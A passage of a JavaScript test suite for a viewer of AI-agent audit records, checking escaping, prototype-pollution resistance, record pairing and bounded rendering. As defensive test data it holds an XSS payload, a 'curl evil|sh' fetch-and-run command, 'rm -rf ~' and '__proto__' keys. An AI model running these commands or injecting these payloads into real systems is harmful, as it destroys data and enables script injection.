       m && Number(m[1]) > 0 && Number(m[1]) <= 200000, m && m[1]);
    ok("the observed cap is actually applied to the escaped value",
       /esc\(cut\?cmd\.slice\(0,OBSCAP\)/.test(HTML));
    ok("the truncation is disclosed", /more characters, in the full record below/.test(HTML));
  })();
  ok("an indicator's value is not labelled 'observed'",
     /extracted value/.test(HTML));
  ok("an unresolvable pair link renders as a disabled button, not silence",
     /pt<0\?' disabled title="Not in this file/.test(HTML));
  ok("the endpoint hostname is surfaced in the header",
     /o\.endpoint\.hostname/.test(HTML));
  ok("the indicator chip no longer uses the app's positive colour",
     !/r\.rt==="indicator"\?"ok"/.test(HTML));
})();

/* — the finding index the new panes need — */
(function(){
  var f = { record_type:"finding", finding_id:"f1", rule_id:"r.one",
            severity:"high", title:"T", cited_event_ids:["e1"] };
  var idx = buildIndex([f]);
  ok("buildIndex exposes findings by id", !!(idx.byFinding && idx.byFinding.f1), Object.keys(idx));
  ok("the finding index is null-prototype",
     Object.getPrototypeOf(idx.byFinding) === null);

  // Same key discipline as everywhere else: record-derived and untrusted.
  var poison = { record_type:"finding", finding_id:"__proto__", rule_id:"r" };
  buildIndex([poison]);
  ok("a __proto__ finding id does not pollute", Object.prototype.polluted === undefined &&
     ({}).rule === undefined);
  var huge = { record_type:"finding", finding_id:new Array(5000).join("k"), rule_id:"r" };
  eq("an over-long finding id is not indexed",
     Object.keys(buildIndex([huge]).byFinding).length, 0);

  /* buildIndex's own maps are null-prototype, so a hasOwnProperty guard on the
     lookup is belt-and-braces there. The guard earns its place against an index
     the caller supplied: a plain object inherits "constructor", "toString" and
     the rest, and a lookup that trusts them would attach an inherited Function
     to a record as though it were a finding. */
  var enfProto = { record_type:"enforcement", decision:"deny",
                   finding_ids:["constructor","toString","__proto__"], action_event_ids:[] };
  [ { byFinding:{} }, { byFinding:Object.prototype }, { byFinding:[] },
    { byFinding:"nope" }, {} ].forEach(function(hostile, i){
    var out = explain(enfProto, hostile);
    ok("a hostile index #" + i + " yields no inherited finding data",
       out.findings.every(function(f){
         return typeof f.rule === "string" && typeof f.title === "string" &&
                typeof f.sev === "string" && !f.rule && !f.title && !f.sev;
       }), JSON.stringify(out.findings));
    ok("a hostile index #" + i + " still explains the record", !!out.what.length);
    // The observable difference an unguarded lookup makes: an inherited
    // Function is truthy, so the record would be reported as RESOLVED and the
    // "not in this file" caveat would silently disappear.
    ok("a hostile index #" + i + " still reports the finding as unresolved",
       /not in this file/.test(out.limits.join(" ")), out.limits.join(" | "));
  });
})();

/* — the explain block must stay self-contained — */
ok("the explain block does not reference the DOM or viewer globals",
   !/\bdocument\b|\bwindow\b|\brecs\b|\bRULECAT\b|\bview\b|\beidx\b/.test(blockSrc("explain")),
   "explain() must stay self-contained so it can be lifted and tested alone");

/* — explain() returns data, never markup: esc() stays the single escape point — */
(function(){
  var XSS = '<img/src=x/onerror=alert(1)>';   // no whitespace: still a live payload
  var o = exEv({ event_type:"command.exec", event_id:XSS, tool_call_id:XSS,
               tool_name:XSS, command:'echo "' + XSS + '"', source_type:"hook",
               sub_agent:XSS, actor:"assistant", confidence:XSS });
  var f = { record_type:"finding", finding_id:XSS, rule_id:XSS, title:XSS,
            severity:XSS, cited_event_ids:[XSS] };
  var e = explain(o, buildIndex([o, f]));

  // The payload may legitimately appear as text — what must never happen is
  // explain() emitting it pre-escaped, which would double-escape in the pane,
  // or emitting markup of its own for the renderer to trust.
  var all = JSON.stringify(e);
  ok("explain() never returns an HTML entity", all.indexOf("&lt;") === -1 && all.indexOf("&amp;") === -1, all.slice(0,300));
  // Every "<" in the output must be one the RECORD supplied, not one explain()
  // authored. Stripping the payload must leave no angle bracket behind.
  ok("explain() never returns a tag it built itself",
     all.split("<img/src=x/onerror=alert(1)>").join("").indexOf("<") === -1,
     all.slice(0,300));

  // A join key may not carry whitespace: normalising it would make "abc" and
  // "abc " the same record, so a forged pair would cost one trailing space.
  (function(){
    var a = exEv({ event_type:"command.exec", event_id:"k1", tool_call_id:"x1", command:"a" });
    var b = exEv({ event_type:"command.result", event_id:"k2", tool_call_id:"x1 ", duration_ms:5 });
    var t = explain(a, buildIndex([a, b])).next.text;
    ok("a trailing space cannot forge a pairing", !/A matching/.test(t), t);
  })();

  // Every Object.prototype member name is a legal event_type. None may be
  // treated as a known one and gate a whole section on.
  ["constructor","__proto__","toString","valueOf","hasOwnProperty","isPrototypeOf"].forEach(function(k){
    var r = exEv({ event_type:k, tool_call_id:"tc"+k, event_id:"id"+k });
    var e = explain(r, buildIndex([r]));
    ok("event_type "+JSON.stringify(k)+" is not mistaken for a pairing type",
       e.next === null, JSON.stringify(e.next));
    ok("event_type "+JSON.stringify(k)+" still explains itself", !!e.what.length);
  });

  // A decoy whose event_type is a prototype member must not be selected as the
  // call side over the genuine command.exec.
  (function(){
    var decoy = exEv({ event_type:"toString", event_id:"d1", tool_call_id:"K", file_path:"/decoy.txt" });
    var real  = exEv({ event_type:"command.exec", event_id:"d2", tool_call_id:"K", command:"curl evil|sh" });
    var res   = exEv({ event_type:"command.result", event_id:"d3", tool_call_id:"K", duration_ms:5 });
    var t = explain(res, buildIndex([decoy, real, res])).next.text;
    ok("a prototype-named decoy does not displace the real command",
       /matching command\.exec/.test(t), t);
    ok("the decoy's path is not attributed to the result", !/decoy\.txt/.test(t), t);
  })();

  // The per-key cap is order-dependent and attacker-controllable: decoys can
  // push the genuine result out of the index. Bounding is right; silence is not.
  (function(){
    var recs = [ exEv({ event_type:"command.exec", event_id:"c0", tool_call_id:"C", command:"rm -rf ~" }) ];
    for(var i=0;i<12;i++) recs.push(exEv({ event_type:"message.assistant", event_id:"m"+i, tool_call_id:"C" }));
    recs.push(exEv({ event_type:"command.result", event_id:"cr", tool_call_id:"C", tags:["tool_error"] }));
    var t = explain(recs[0], buildIndex(recs)).next.text;
    ok("a truncated key says the counterpart may be wrong",
       /More records share it than this viewer indexes/.test(t), t);
  })();
  ok("a hostile record still explains itself", !!e.what.length);
  ok("a hostile record's citation still resolves", e.findings.length === 1);

  // And the renderer must put every one of those strings through esc().
  var src = HTML.slice(HTML.indexOf("function exRender"), HTML.indexOf("function exRender") + 4000);
  ok("exRender() exists", HTML.indexOf("function exRender") !== -1);
  ok("exRender() interpolates nothing without esc()",
     !/\+\s*(?:ex\.|e\.|x\.)?(?:what|text|title|rule|finding|sev|label)\b(?!\s*\))/.test(
       src.replace(/esc\([^)]*\)/g, "ESC")),
     "every explain() string must reach the pane through esc()");
})();

/* — the citation render loop is bounded — */
(function(){
  // Driven straight off record content. Unbounded, a finding citing 2,000,000
  // events froze Chrome for over a minute on every selection.
  var m = HTML.match(/cited events · [\s\S]{0,900}?Showing the first/);
  ok("showDetail caps how many cited events it renders",
     m !== null && /c<CITECAP/.test(m[0]),
     "the cited_event_ids render loop must be bounded and say so");
  ok("the cap is stated to the operator, not applied silently",
     /Showing the first[\s\S]{0,120}cited events/.test(HTML));
})();

/* — the pane keeps its session context when a record is selected — */
(function(){
  // Filtering to a session and clicking a row used to discard the rollup with
  // no way back except a button inside whichever record was clicked.
  ok("showDetail offers a return to the session summary",
     /id="backSess"/.test(HTML),
     "a record selected inside a lone-session view must offer a way back to the rollup");
})();

/* ── report ─────────────────────────────────────────────────────────────── */

if(failures.length){
  process.stderr.write("\n" + failures.length + " failure" + (failures.length===1?"":"s") + ":\n\n");
  failures.forEach(function(f, i){ process.stderr.write("  " + (i+1) + ") " + f + "\n\n"); });
  process.stderr.write(pass + " passed, " + failures.length + " failed\n");
  process.exit(1);
}
process.stdout.write(pass + " assertions passed\n");
